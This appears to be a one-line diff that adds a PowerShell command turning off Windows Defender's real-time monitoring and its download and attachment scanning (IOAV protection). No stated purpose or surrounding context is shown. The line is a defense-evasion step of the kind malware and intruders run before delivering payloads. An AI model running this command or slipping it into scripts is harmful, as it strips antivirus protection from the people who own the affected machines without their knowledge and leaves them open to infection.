@@ -1,0 +1,1 @@
+Set-MpPreference -DisableIOAVProtection 1; Set-MpPreference -DisableRealtimeMonitoring 1
